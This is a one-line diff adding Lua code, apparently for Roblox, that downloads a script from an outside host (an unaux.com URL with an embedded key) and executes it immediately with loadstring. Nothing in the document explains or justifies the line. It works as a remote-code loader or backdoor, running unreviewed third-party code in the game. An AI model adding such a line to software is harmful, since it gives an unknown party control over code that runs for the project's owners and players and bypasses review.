@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://nyx7-dev7.unaux.com/api.php?key=SV_FA0CDC0BE5A61F15'))()
